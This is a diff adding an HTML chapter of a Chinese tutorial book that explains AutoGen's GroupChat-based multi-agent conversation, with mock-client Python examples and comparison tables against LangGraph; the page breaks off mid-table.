@@ -1,0 +1,1738 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="第 14 章：用 AutoGen 构对话式多 Agent——对话驱动的多 Agent 编排 | 《AGENT开发从入门到精通》">
+  <title>第 14 章：用 AutoGen 构对话式多 Agent——对话驱动的多 Agent 编排 | AGENT开发从入门到精通</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/[email protected]/styles/atom-one-dark.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/[email protected]/build/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  <link rel="stylesheet" href="/assets/css/book.css">
+  <link rel="stylesheet" href="/assets/css/site.css">
+  <style>
+    :root {
+      --book-accent: linear-gradient(90deg, #c026d3, #f97316);
+      --book-accent-bg: rgba(192, 38, 211, 0.15);
+      --book-accent-fg: #c026d3;
+    }
+    .logo-icon {
+      background: var(--book-accent);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    .chapter-content h2 {
+      border-left: 4px solid var(--book-accent-fg, #c026d3);
+      padding-left: 14px;
+      margin-top: 40px;
+    }
+    .chapter-content h3 {
+      color: var(--book-accent-fg, #c026d3);
+    }
+    .chapter-content a {
+      color: var(--book-accent-fg, #c026d3);
+    }
+    .chapter-content table.md-table {
+      border-collapse: collapse;
+      margin: 16px 0;
+      width: 100%;
+      font-size: 14px;
+    }
+    .chapter-content table.md-table th,
+    .chapter-content table.md-table td {
+      border: 1px solid rgba(192,38,211,0.2);
+      padding: 8px 12px;
+      text-align: left;
+    }
+    .chapter-content table.md-table th {
+      background: var(--book-accent-bg);
+      color: var(--book-accent-fg);
+      font-weight: 600;
+    }
+    .chapter-content table.md-table tr:hover {
+      background: rgba(192,38,211,0.05);
+    }
+    .chapter-content code {
+      background: rgba(192,38,211,0.1);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.9em;
+    }
+    .chapter-content pre {
+      border-radius: 8px;
+      overflow-x: auto;
+      margin: 16px 0;
+    }
+    .chapter-content blockquote {
+      border-left: 4px solid var(--book-accent-fg, #c026d3);
+      background: var(--book-accent-bg);
+      padding: 12px 16px;
+      margin: 16px 0;
+      border-radius: 4px;
+      color: #555;
+    }
+    .chapter-content blockquote.chapter-intro {
+      font-size: 15px;
+      line-height: 1.7;
+    }
+    .chapter-content ul, .chapter-content ol {
+      padding-left: 28px;
+    }
+    .chapter-content li {
+      margin: 4px 0;
+    }
+    .chapter-hero {
+      margin: 20px 0 30px;
+      padding: 16px;
+      background: linear-gradient(135deg, rgba(192,38,211,0.03), rgba(249,115,22,0.03));
+      border-radius: 12px;
+    }
+    .chapter-title {
+      font-size: 28px;
+      font-weight: 700;
+      background: var(--book-accent);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin-bottom: 8px;
+    }
+    .chapter-subtitle {
+      font-size: 14px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+
+<header class="site-header">
+  <div class="header-inner">
+    <a href="../index.html" class="logo">
+      <span class="logo-icon">🤖</span>
+      <span class="logo-text">AGENT开发从入门到精通</span>
+    </a>
+    <nav class="site-nav">
+      <a href="../index.html">书库首页</a>
+      <a href="../index.html#chapters">章节总览</a>
+      <a href="../index.html#progress">阅读进度</a>
+      <a href="ch13.html">上一章</a>
+    </nav>
+  </div>
+</header>
+
+<main class="chapter-content" style="max-width:920px; margin:0 auto; padding:40px 20px;">
+
+<div class="chapter-hero">
+  <h1 class="chapter-title">第 14 章：用 AutoGen 构对话式多 Agent——对话驱动的多 Agent 编排</h1>
+  <p class="chapter-subtitle">第 14 章 · 用 AutoGen 构对话式多 Agent——对话驱动的多 Agent 编排</p>
+</div>
+
+<svg viewBox="0 0 800 380" xmlns="http://www.w3.org/2000/svg" style="width:100%; max-width:800px; display:block; margin:16px auto;">
+  <defs>
+    <linearGradient id="ch14grad" x1="0" y1="0" x2="1" y2="0">
+      <stop offset="0%" stop-color="#c026d3"/>
+      <stop offset="100%" stop-color="#f97316"/>
+    </linearGradient>
+    <marker id="arrow14" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+      <path d="M 0 0 L 10 5 L 0 10 z" fill="#c026d3"/>
+    </marker>
+    <marker id="arrow14orange" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+      <path d="M 0 0 L 10 5 L 0 10 z" fill="#f97316"/>
+    </marker>
+  </defs>
+
+  <!-- Top callout: ch13 图 vs ch14 对话 -->
+  <g transform="translate(80, 18)">
+    <rect x="0" y="0" width="640" height="28" fill="rgba(249,115,22,0.08)" stroke="#f97316" stroke-width="1" rx="6"/>
+    <text x="320" y="19" text-anchor="middle" font-size="12" font-weight="700" fill="#f97316">ch13 图（StateGraph）vs ch14 对话（GroupChat）—— 后者短 1.5-3x 代码</text>
+  </g>
+
+  <!-- Message Bus label -->
+  <g transform="translate(20, 130)">
+    <rect x="0" y="0" width="760" height="40" fill="url(#ch14grad)" rx="6" opacity="0.15"/>
+    <text x="380" y="25" text-anchor="middle" font-size="13" font-weight="700" fill="#c026d3">📨 GroupChat Message Bus（共享 messages 列表 — 所有 Agent 可见）</text>
+  </g>
+
+  <!-- Center: GroupChat Manager (circular) -->
+  <g transform="translate(400, 230)">
+    <circle cx="0" cy="0" r="48" fill="url(#ch14grad)" stroke="#c026d3" stroke-width="3"/>
+    <text x="0" y="-8" text-anchor="middle" font-size="13" font-weight="700" fill="#fff">🎯 GroupChat</text>
+    <text x="0" y="10" text-anchor="middle" font-size="13" font-weight="700" fill="#fff">Manager</text>
+    <text x="0" y="26" text-anchor="middle" font-size="9" fill="rgba(255,255,255,0.9)">speaker selection</text>
+  </g>
+
+  <!-- 3 Speaker nodes around the Manager -->
+  <!-- Researcher (left) -->
+  <g transform="translate(120, 80)">
+    <rect x="-55" y="-28" width="110" height="56" fill="rgba(192,38,211,0.1)" stroke="#c026d3" stroke-width="2" rx="8"/>
+    <text x="0" y="-8" text-anchor="middle" font-size="12" font-weight="700" fill="#c026d3">🔵 Researcher</text>
+    <text x="0" y="8" text-anchor="middle" font-size="9" fill="#555">AssistantAgent</text>
+    <text x="0" y="20" text-anchor="middle" font-size="8" fill="#888">description + tools</text>
+  </g>
+
+  <!-- Writer (right) -->
+  <g transform="translate(680, 80)">
+    <rect x="-55" y="-28" width="110" height="56" fill="rgba(192,38,211,0.1)" stroke="#c026d3" stroke-width="2" rx="8"/>
+    <text x="0" y="-8" text-anchor="middle" font-size="12" font-weight="700" fill="#c026d3">✍️ Writer</text>
+    <text x="0" y="8" text-anchor="middle" font-size="9" fill="#555">AssistantAgent</text>
+    <text x="0" y="20" text-anchor="middle" font-size="8" fill="#888">description + tools</text>
+  </g>
+
+  <!-- Critic (bottom) -->
+  <g transform="translate(400, 340)">
+    <rect x="-55" y="-28" width="110" height="56" fill="rgba(192,38,211,0.1)" stroke="#c026d3" stroke-width="2" rx="8"/>
+    <text x="0" y="-8" text-anchor="middle" font-size="12" font-weight="700" fill="#c026d3">🧐 Critic</text>
+    <text x="0" y="8" text-anchor="middle" font-size="9" fill="#555">AssistantAgent</text>
+    <text x="0" y="20" text-anchor="middle" font-size="8" fill="#888">description + tools</text>
+  </g>
+
+  <!-- Speaker Selection arrows (Manager → next speaker, dashed) -->
+  <g>
+    <path d="M 360 215 Q 280 165 175 110" fill="none" stroke="#c026d3" stroke-width="2" stroke-dasharray="5,3" marker-end="url(#arrow14)"/>
+    <text x="265" y="155" text-anchor="middle" font-size="9" fill="#c026d3" font-weight="600">①select</text>
+
+    <path d="M 440 215 Q 540 165 625 110" fill="none" stroke="#c026d3" stroke-width="2" stroke-dasharray="5,3" marker-end="url(#arrow14)"/>
+    <text x="555" y="155" text-anchor="middle" font-size="9" fill="#c026d3" font-weight="600">②select</text>
+
+    <path d="M 410 280 Q 410 305 410 312" fill="none" stroke="#c026d3" stroke-width="2" stroke-dasharray="5,3" marker-end="url(#arrow14)"/>
+    <text x="430" y="298" text-anchor="start" font-size="9" fill="#c026d3" font-weight="600">③select</text>
+  </g>
+
+  <!-- Message arrows between speakers (via bus, solid orange) -->
+  <g>
+    <!-- Researcher → Writer (via bus) -->
+    <path d="M 175 100 Q 380 60 625 100" fill="none" stroke="#f97316" stroke-width="1.5" marker-end="url(#arrow14orange)"/>
+    <text x="380" y="55" text-anchor="middle" font-size="9" fill="#f97316">msg</text>
+
+    <!-- Writer → Critic (via bus) -->
+    <path d="M 680 110 Q 680 230 455 340" fill="none" stroke="#f97316" stroke-width="1.5" marker-end="url(#arrow14orange)"/>
+    <text x="700" y="230" text-anchor="start" font-size="9" fill="#f97316">msg</text>
+
+    <!-- Critic → Researcher (via bus, loop) -->
+    <path d="M 345 340 Q 120 280 120 110" fill="none" stroke="#f97316" stroke-width="1.5" stroke-dasharray="3,2" marker-end="url(#arrow14orange)"/>
+    <text x="55" y="230" text-anchor="end" font-size="9" fill="#f97316">next round</text>
+  </g>
+
+  <!-- Bottom callout -->
+  <g transform="translate(80, 358)">
+    <rect x="0" y="0" width="640" height="20" fill="rgba(192,38,211,0.05)" stroke="#c026d3" stroke-width="1" rx="4"/>
+    <text x="320" y="14" text-anchor="middle" font-size="11" fill="#c026d3" font-weight="600">💬 对话 = 一等公民 — GroupChatManager 选下一 speaker，所有 Agent 共享 messages 列表</text>
+  </g>
+</svg>
+
+<p style="text-align:center; color:#888; font-size:13px; margin-top:8px;"><strong>第 11 种 inline SVG 形态学</strong> — 对话总线 + 多角色对话编排（vs ch11 hub-and-spoke 4 模式 / ch13 节点-边-状态三元组）</p>
+
+<blockquote>
+<p><strong>承上启下</strong>：ch13 讲了 LangGraph 的&quot;图编排&quot;——把工作流显式建模成 State + Nodes + Edges。但<strong>多 Agent 协作不一定都是图</strong>——很多时候是<strong>多角色对话</strong>（研究员、作家、评论家轮番发言）。这种场景用 LangGraph 写就得手撸节点+边+条件路由，而 <strong>AutoGen（Microsoft Research 出品）</strong>直接给你&quot;对话总线&quot;——<code>GroupChat</code> 帮你管谁接下来说什么。</p>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>本章拆解 AutoGen 的 <strong>2 大核心角色 + GroupChat 编排 + ReAct/Supervisor 实战</strong>——读完能用 AutoGen 把 ch11 模式（Supervisor / Crew / Debate）中的&quot;对话型&quot;实现快速落地。</p>
+</blockquote>
+<hr>
+<h2 id="sec-14-1-引子-ch13-留下的-2-个问题-autogen-的回答">14.1 引子：ch13 留下的 2 个问题 + AutoGen 的回答</h2>
+<h3 id="sec-14-1-1-ch13-留下的-2-个落地问题">14.1.1 ch13 留下的 2 个落地问题</h3>
+<p>ch13 解决了&quot;工作流编排&quot;问题，但留下了 2 个场景用 LangGraph 不顺手：</p>
+<table class="md-table"><thead><tr>
+<th>场景</th>
+<th>ch13 LangGraph 怎么写</th>
+<th>痛点</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>辩论（正方/反方/裁判）</strong></td>
+<td>同样得手撸 N 节点 + 双向边 + 终止条件</td>
+<td>状态膨胀（所有发言累积在 messages），没有内置&quot;哪一方该说&quot;机制</td>
+</tr>
+</tbody></table>
+<p><strong>结论</strong>：当 Agent 协作是<strong>多角色对话</strong>（不是&quot;流程图&quot;）时，<strong>对话总线比图编排更自然</strong>。</p>
+<h3 id="sec-14-1-2-autogen-的回答-让对话成为一等公民">14.1.2 AutoGen 的回答——&quot;让对话成为一等公民&quot;</h3>
+<p><strong>AutoGen v0.4（2024-Q4 重写版）</strong>的核心抽象：</p>
+<ul>
+<li><strong>Actor Model 架构</strong>（不是图！）—— 每个 Agent 是独立 actor，通过消息总线通信</li>
+<li><strong><code>GroupChat</code> 内置 messages 列表</strong>——所有发言累积，对所有参与者可见</li>
+<li><strong><code>GroupChatManager</code> 自动选下一 speaker</strong>——不用手撸 if-else 路由</li>
+<li><strong><code>is_termination_msg</code> 终止判定</strong>——任意 Agent 都可以发&quot;收工&quot;消息</li>
+<li><strong><code>UserProxyAgent</code> 人机协作</strong>——把人类作为对话的一等公民</li>
+</ul>
+<p><strong>一句话总结</strong>：<strong>AutoGen = 显式对话 + 隐式控制流 = 多角色协作的最短代码路径</strong>。</p>
+<h3 id="sec-14-1-3-ch13-图编排-vs-ch14-对话编排-7-维度对照表">14.1.3 ch13 图编排 vs ch14 对话编排——7 维度对照表</h3>
+<table class="md-table"><thead><tr>
+<th>维度</th>
+<th>ch13 LangGraph</th>
+<th><strong>ch14 AutoGen</strong></th>
+</tr></thead><tbody>
+<tr>
+<td><strong>状态载体</strong></td>
+<td><code>State</code> TypedDict + Reducer</td>
+<td><code>GroupChat.messages</code> 列表</td>
+</tr>
+<tr>
+<td><strong>控制流</strong></td>
+<td>条件边 / 路由函数（手写）</td>
+<td><code>GroupChatManager.speaker_selection</code>（自动）</td>
+</tr>
+<tr>
+<td><strong>终止条件</strong></td>
+<td><code>add_edge(..., END)</code></td>
+<td><code>TerminationCondition</code>（可组合）</td>
+</tr>
+<tr>
+<td><strong>人机协作</strong></td>
+<td><code>interrupt()</code> 暂停</td>
+<td><code>UserProxyAgent</code>（一公民）</td>
+</tr>
+<tr>
+<td><strong>代码长度</strong></td>
+<td>30-50 行（hello world）</td>
+<td><strong>20-30 行</strong>（更短）</td>
+</tr>
+<tr>
+<td><strong>适用场景</strong></td>
+<td>多分支 / 长流程 / checkpoint / 可视化</td>
+<td><strong>多角色对话 / 头脑风暴 / 辩论 / 快速原型</strong></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>核心差异</strong>：LangGraph 是&quot;先有图再跑对话&quot;，AutoGen 是&quot;直接跑对话图自己长出来&quot;。前者工程师友好，后者产品/业务友好。</p>
+</blockquote>
+<hr>
+<h2 id="sec-14-2-autogen-是什么">14.2 AutoGen 是什么</h2>
+<h3 id="sec-14-2-1-autogen-历史与版本演进">14.2.1 AutoGen 历史与版本演进</h3>
+<table class="md-table"><thead><tr>
+<th>版本</th>
+<th>时间</th>
+<th>关键特性</th>
+<th>包名</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>v0.4 重写</strong></td>
+<td>2024-Q4</td>
+<td><strong>Actor Model 架构</strong>、跨语言（.NET / Python）、<code>autogen-core</code> + <code>autogen-agentchat</code> 分层、内置 <code>GroupChat</code> / <code>SelectorGroupChat</code> / <code>Swarm</code></td>
+<td><code>autogen-agentchat</code> / <code>autogen-core</code></td>
+</tr>
+<tr>
+<td><strong>v0.7.x</strong>（当前）</td>
+<td>2025</td>
+<td>进一步拆分 <code>autogen-ext</code>（模型客户端扩展）、<code>autogenstudio</code>（低代码 GUI）、Magentic-One 多 Agent 框架</td>
+<td>同上</td>
+</tr>
+</tbody></table>
+<p><strong>本章以 v0.4 / v0.7.5 为准</strong>（当前主流，Microsoft 主推）。v0.2 的 <code>pyautogen</code> 已停止主要开发。</p>
+<h3 id="sec-14-2-2-v0-4-架构-actor-model-消息总线">14.2.2 v0.4 架构：Actor Model + 消息总线</h3>
+<p>AutoGen v0.4 的核心是 <strong>Actor Model</strong>（1973 年 Carl Hewitt 提出的并发计算模型）：</p>
+<ul>
+<li><strong>每个 Agent 就是一个 Actor</strong> —— 独立状态机，对外只通过消息交互</li>
+<li><strong>消息总线（RoutedAgent）</strong> —— 所有消息通过 <code>autogen-core</code> 的 runtime 路由</li>
+<li><strong>跨语言</strong> —— Python Agent 和 .NET Agent 可以互相发消息（共享 protobuf 协议）</li>
+<li><strong>可观测</strong> —— 整个对话流可被 OpenTelemetry 采集</li>
+</ul>
+<p><strong>为什么 Actor Model 比图更好？</strong> 当 Agent 数量从 3 个涨到 30 个、且互相通信关系是动态的（图边动态变化）时，Actor Model 的&quot;消息地址&quot;机制比图的&quot;边&quot;更灵活。但反过来——<strong>如果你的工作流是固定的、显式的、需可视化</strong>，LangGraph 的图更直接。</p>
+<h3 id="sec-14-2-3-v0-4-包结构与安装">14.2.3 v0.4 包结构与安装</h3>
+<pre><code class="language-bash">
+# 推荐安装（2025 主流）
+python3 -m venv .venv
+.venv/bin/pip install autogen-agentchat            # 核心 + Agent 定义
+.venv/bin/pip install &quot;autogen-ext[openai]&quot;        # OpenAI 模型客户端
+# 可选
+.venv/bin/pip install &quot;autogen-ext[anthropic]&quot;     # Anthropic Claude
+.venv/bin/pip install &quot;autogen-ext[ollama]&quot;        # 本地 Ollama
+</code></pre>
+<p><strong>包分工</strong>：</p>
+<ul>
+<li><code>autogen-core</code>：Actor runtime + 消息路由（不直接用）</li>
+<li><code>autogen-agentchat</code>：Agent 类（<code>AssistantAgent</code> / <code>UserProxyAgent</code> / <code>CodeExecutorAgent</code>） + 团队类（<code>RoundRobinGroupChat</code> / <code>SelectorGroupChat</code> / <code>Swarm</code>） + 终止条件</li>
+<li><code>autogen-ext[openai/anthropic/...]</code>：模型客户端扩展</li>
+</ul>
+<hr>
+<h2 id="sec-14-3-2-大核心角色-assistantagent-userproxyagent">14.3 2 大核心角色：AssistantAgent + UserProxyAgent</h2>
+<h3 id="sec-14-3-1-assistantagent-llm-角色">14.3.1 AssistantAgent：LLM 角色</h3>
+<p><code>AssistantAgent</code> 是&quot;会说人话 + 能调工具&quot;的 Agent：</p>
+<pre><code class="language-python">
+from autogen_agentchat.agents import AssistantAgent
+
+agent = AssistantAgent(
+    name=&quot;assistant&quot;,                    # 必填，对话中显示
+    model_client=model_client,           # 必填，LLM 客户端（OpenAI/Anthropic/Mock）
+    system_message=&quot;你是一个助手。&quot;,     # 可选，system prompt
+    tools=[my_tool],                     # 可选，工具列表（Function Calling）
+    description=&quot;短描述，给其他 Agent 看&quot;, # 可选
+)
+</code></pre>
+<p><strong>关键点</strong>：</p>
+<ul>
+<li><code>name</code> 必须<strong>全局唯一</strong>（同一 <code>GroupChat</code> 内）</li>
+<li><code>system_message</code> 是该 Agent 的&quot;人设&quot;</li>
+<li><code>tools</code> 自动转成 OpenAI / Anthropic 的 function calling schema</li>
+<li><code>description</code> 在 <code>SelectorGroupChat</code> 选 speaker 时会被 LLM 看到</li>
+</ul>
+<h3 id="sec-14-3-2-userproxyagent-人-工具-代码执行代理">14.3.2 UserProxyAgent：人/工具/代码执行代理</h3>
+<p><code>UserProxyAgent</code> 是&quot;人 + 工具 + 代码执行&quot;的复合代理：</p>
+<pre><code class="language-python">
+from autogen_agentchat.agents import UserProxyAgent
+
+# 模式 1：作为人机界面（接收人类输入）
+human = UserProxyAgent(
+    name=&quot;human&quot;,
+    input_mode=&quot;console&quot;,     # 等待用户输入
+)
+
+# 模式 2：作为代码执行器（在 Docker / 本地跑代码）
+executor = UserProxyAgent(
+    name=&quot;executor&quot;,
+    code_execution_config={
+        &quot;executor&quot;: &quot;docker&quot;,   # 或 &quot;local&quot;
+        &quot;image&quot;: &quot;python:3.12&quot;, # Docker 镜像
+    },
+)
+
+# 模式 3：纯占位（不执行，仅作为对话参与者）
+placeholder = UserProxyAgent(
+    name=&quot;placeholder&quot;,
+    input_mode=&quot;never&quot;,        # 不等待输入
+)
+</code></pre>
+<p><strong>3 种模式</strong>：</p>
+<ul>
+<li><strong>人机界面</strong>：<code>input_mode=&quot;console&quot;</code> 等待人类回复</li>
+<li><strong>代码执行</strong>：在 Docker 或本地跑 LLM 生成的代码（v0.4 已移到独立 <code>CodeExecutorAgent</code>）</li>
+<li><strong>纯占位</strong>：不执行任何事，仅作为对话角色</li>
+</ul>
+<blockquote>
+<p><strong>v0.4 vs v0.2 重要变化</strong>：<code>UserProxyAgent</code> 在 v0.4 中代码执行功能被拆到 <code>CodeExecutorAgent</code>（v0.2 用 <code>code_execution_config</code> 即可）。本章用 v0.4 写法。</p>
+</blockquote>
+<h3 id="sec-14-3-3-hello-world-单-assistant-单-userproxy-30-行">14.3.3 Hello World：单 Assistant + 单 UserProxy 30 行</h3>
+<p><strong>场景</strong>：让 LLM 助手回答&quot;1+1=?&quot;，人作为对话参与者。</p>
+<pre><code class="language-python">
+import asyncio
+from autogen_agentchat.agents import AssistantAgent, UserProxyAgent
+from autogen_agentchat.teams import RoundRobinGroupChat
+from autogen_agentchat.conditions import MaxMessageTermination
+
+
+# 模型客户端（实际用 OpenAIChatCompletionClient，这里 mock 演示）
+from autogen_core.models import CreateResult, ModelInfo
+
+
+class MockChatClient:
+    &quot;&quot;&quot;Mock LLM — 真实场景换 OpenAIChatCompletionClient(model=&quot;gpt-4o&quot;) 即可&quot;&quot;&quot;
+    def __init__(self, response: str):
+        self._response = response
+        self.model_info: ModelInfo = {
+            &quot;vision&quot;: False, &quot;function_calling&quot;: False, &quot;json_output&quot;: False,
+            &quot;family&quot;: &quot;mock&quot;, &quot;structured_output&quot;: False, &quot;multiple_system_messages&quot;: True,
+        }
+
+    async def create(self, messages, **kwargs) -&gt; CreateResult:
+        return CreateResult(
+            content=self._response, finish_reason=&quot;stop&quot;,
+            usage={&quot;prompt_tokens&quot;: 5, &quot;completion_tokens&quot;: 5}, cached=False,
+        )
+    async def close(self): pass
+
+
+async def main():
+    assistant = AssistantAgent(
+        name=&quot;assistant&quot;,
+        model_client=MockChatClient(&quot;1+1=2。&quot;),
+        system_message=&quot;你是一个数学助手。&quot;,
+    )
+    user = UserProxyAgent(name=&quot;user&quot;, input_mode=&quot;never&quot;)  # 纯占位
+
+    team = RoundRobinGroupChat(
+        participants=[assistant, user],
+        termination_condition=MaxMessageTermination(max_messages=2),
+    )
+
+    result = await team.run(task=&quot;1+1=多少？&quot;)
+    for m in result.messages:
+        print(f&quot;[{m.source}] {m.content}&quot;)
+
+
+asyncio.run(main())
+</code></pre>
+<p><strong>运行</strong>（venv 内）：<code>python3 hello_autogen.py</code></p>
+<p><strong>输出</strong>：</p>
+<pre><code class="language-python">
+[user] 1+1=多少？
+[assistant] 1+1=2。
+</code></pre>
+<p><strong>对照 LangGraph 30 行</strong>：AutoGen 版本代码更短、配置项更少——核心是&quot;配置 Agent&quot;而非&quot;配置图&quot;。</p>
+<hr>
+<h2 id="sec-14-4-groupchat-多-agent-对话总线-核心">14.4 GroupChat 多 Agent 对话总线（核心）</h2>
+<h3 id="sec-14-4-1-groupchat-是什么">14.4.1 GroupChat 是什么</h3>
+<p><strong><code>GroupChat</code>（在 v0.4 中对应 <code>RoundRobinGroupChat</code> / <code>SelectorGroupChat</code>）</strong> = 3 个或更多 Agent 共享一个 messages 列表，按规则轮番发言。</p>
+<table class="md-table"><thead><tr>
+<th>团队类</th>
+<th>选下一 speaker 方式</th>
+<th>适用场景</th>
+</tr></thead><tbody>
+<tr>
+<td><strong><code>SelectorGroupChat</code></strong></td>
+<td><strong>LLM 选</strong>（让 GPT-4 看历史 + agent description 决定下一个）</td>
+<td>动态决策（谁能回答就谁来）</td>
+</tr>
+<tr>
+<td><strong><code>Swarm</code></strong></td>
+<td><strong>Agent 自己决定</strong>（hand_off 消息）</td>
+<td>类似 AutoGen v0.2 Swarm 范式</td>
+</tr>
+<tr>
+<td><strong><code>MagenticOneGroupChat</code></strong></td>
+<td>微软 Magentic-One 编排器</td>
+<td>复杂多 Agent 任务（网页操作 + 文件 + 代码）</td>
+</tr>
+</tbody></table>
+<p><strong>本章主要讲 <code>RoundRobinGroupChat</code> 和 <code>SelectorGroupChat</code></strong>——前者是入门，后者是进阶。</p>
+<h3 id="sec-14-4-2-groupchat-完整-hello-world-50-行-3-角色写短文">14.4.2 GroupChat 完整 Hello World 50 行——3 角色写短文</h3>
+<p><strong>场景</strong>：Researcher（研究员）+ Writer（作家）+ Critic（评论家）3 角色合作写一段 100 字的西湖历史短文。</p>
+<pre><code class="language-python">
+import asyncio
+from autogen_agentchat.agents import AssistantAgent
+from autogen_agentchat.teams import RoundRobinGroupChat
+from autogen_agentchat.conditions import MaxMessageTermination
+from autogen_core.models import CreateResult, ModelInfo
+
+
+class CannedClient:
+    &quot;&quot;&quot;按调用次数返回预设 response — 不需要真 LLM&quot;&quot;&quot;
+    def __init__(self, *responses: str):
+        self._responses = list(responses)
+        self._idx = 0
+        self.model_info: ModelInfo = {
+            &quot;vision&quot;: False, &quot;function_calling&quot;: False, &quot;json_output&quot;: False,
+            &quot;family&quot;: &quot;mock&quot;, &quot;structured_output&quot;: False, &quot;multiple_system_messages&quot;: True,
+        }
+
+    async def create(self, messages, **kwargs) -&gt; CreateResult:
+        text = self._responses[min(self._idx, len(self._responses) - 1)]
+        self._idx += 1
+        return CreateResult(
+            content=text, finish_reason=&quot;stop&quot;,
+            usage={&quot;prompt_tokens&quot;: 10, &quot;completion_tokens&quot;: len(text)}, cached=False,
+        )
+    async def close(self): pass
+
+
+async def write_essay():
+    # 3 个角色 — 每个有自己的 system_message + mock response
+    researcher = AssistantAgent(
+        name=&quot;Researcher&quot;,
+        model_client=CannedClient(
+            &quot;调研：杭州西湖原为海湾，后成内陆湖；唐代白居易任杭州刺史修白堤。&quot;,
+            &quot;补充：北宋苏轼任杭州知州修苏堤，南宋形成&#x27;西湖十景&#x27;。&quot;,
+        ),
+        system_message=&quot;你是一个研究员，提供准确历史事实。&quot;,
+    )
+    writer = AssistantAgent(
+        name=&quot;Writer&quot;,
+        model_client=CannedClient(
+            &quot;西湖历史悠久，自唐宋以来便是文人墨客的圣地。&quot;,
+            &quot;西湖承载着白居易、苏轼的诗情，也见证了十景的诗意。&quot;,
+        ),
+        system_message=&quot;你是一个作家，把资料写成有文采的句子。&quot;,
+    )
+    critic = AssistantAgent(
+        name=&quot;Critic&quot;,
+        model_client=CannedClient(
+            &quot;建议加诗词引用（如苏轼&#x27;欲把西湖比西子&#x27;），更有文化氛围。&quot;,
+            &quot;现在好多了，可以收尾。&quot;,
+        ),
+        system_message=&quot;你是一个评论家，给改进建议。&quot;,
+    )
+
+    # 团队 — 3 角色轮转，最多 6 条消息（3 角色 × 2 轮）
+    team = RoundRobinGroupChat(
+        participants=[researcher, writer, critic],
+        termination_condition=MaxMessageTermination(max_messages=6),
+    )
+
+    result = await team.run(task=&quot;合作写一段 100 字西湖历史短文。&quot;)
+    print(f&quot;\n=== 共 {len(result.messages)} 条消息 ===\n&quot;)
+    for i, m in enumerate(result.messages):
+        print(f&quot;[{i}] [{m.source}] {m.content[:80]}&quot;)
+
+
+asyncio.run(write_essay())
+</code></pre>
+<p><strong>实际跑通输出</strong>（venv + autogen-agentchat 0.7.5）：</p>
+<pre><code class="language-python">
+=== 共 6 条消息 ===
+
+[0] [user] 合作写一段 100 字西湖历史短文。
+[1] [Researcher] 调研：杭州西湖原为海湾...
+[2] [Writer] 西湖历史悠久，自唐宋以来...
+[3] [Critic] 建议加诗词引用...
+[4] [Researcher] 补充：北宋苏轼任杭州知州...
+[5] [Writer] 西湖承载着白居易、苏轼的诗情...
+</code></pre>
+<p><strong>对照 LangGraph 实现</strong>：同样 3 角色 + 2 轮对话，LangGraph 需要手撸 3 节点 + 4 条边 + 终止判断 ≈ 50-60 行；AutoGen 30 行配置 + 团队自动管理。</p>
+<h3 id="sec-14-4-3-speaker-selection-4-种策略">14.4.3 speaker selection 4 种策略</h3>
+<table class="md-table"><thead><tr>
+<th>策略</th>
+<th>实现类</th>
+<th>选 speaker 方式</th>
+<th>优点</th>
+<th>缺点</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>LLM 选</strong></td>
+<td><code>SelectorGroupChat</code></td>
+<td>GPT-4 看历史 + 角色 description 选</td>
+<td>动态、灵活</td>
+<td>多花 1 次 LLM 调用</td>
+</tr>
+<tr>
+<td><strong>Agent 自决</strong></td>
+<td><code>Swarm</code></td>
+<td>当前 Agent 发 <code>HandoffMessage</code></td>
+<td>自主决策</td>
+<td>调试复杂（无全局视图）</td>
+</tr>
+<tr>
+<td><strong>Magentic-One 编排</strong></td>
+<td><code>MagenticOneGroupChat</code></td>
+<td>微软 Magentic-One 编排器选</td>
+<td>适合复杂任务</td>
+<td>黑盒、依赖微软模型</td>
+</tr>
+</tbody></table>
+<p><strong>90% 场景用 <code>RoundRobinGroupChat</code> 或 <code>SelectorGroupChat</code> 即可</strong>。<code>Swarm</code> 适合&quot;每个 Agent 知道该交给谁&quot;的场景（少用）；<code>MagenticOneGroupChat</code> 适合&quot;我也不知道谁该做&quot;的复杂任务。</p>
+<h3 id="sec-14-4-4-groupchat-vs-langgraph-supervisor-哲学对比">14.4.4 GroupChat vs LangGraph Supervisor 哲学对比</h3>
+<table class="md-table"><thead><tr>
+<th>维度</th>
+<th>LangGraph Supervisor</th>
+<th>AutoGen GroupChat</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>中心化程度</strong></td>
+<td><strong>强中心化</strong>（所有 Worker 必须听 Supervisor）</td>
+<td><strong>弱中心化</strong>（任何 Agent 都可以&quot;插话&quot;）</td>
+</tr>
+<tr>
+<td><strong>代码量</strong></td>
+<td>多（手撸 Supervisor 节点 + 路由）</td>
+<td><strong>少</strong>（配置 participants 即可）</td>
+</tr>
+<tr>
+<td><strong>可观测</strong></td>
+<td>强（图可视化 + LangSmith）</td>
+<td>中（消息列表 + OpenTelemetry）</td>
+</tr>
+<tr>
+<td><strong>适合规模</strong></td>
+<td>3-10 个 Agent（多了 Supervisor 成瓶颈）</td>
+<td><strong>3-30 个 Agent</strong>（多 Agent 协作时不会卡 Manager）</td>
+</tr>
+<tr>
+<td><strong>哲学</strong></td>
+<td>&quot;工程师画流程图&quot;</td>
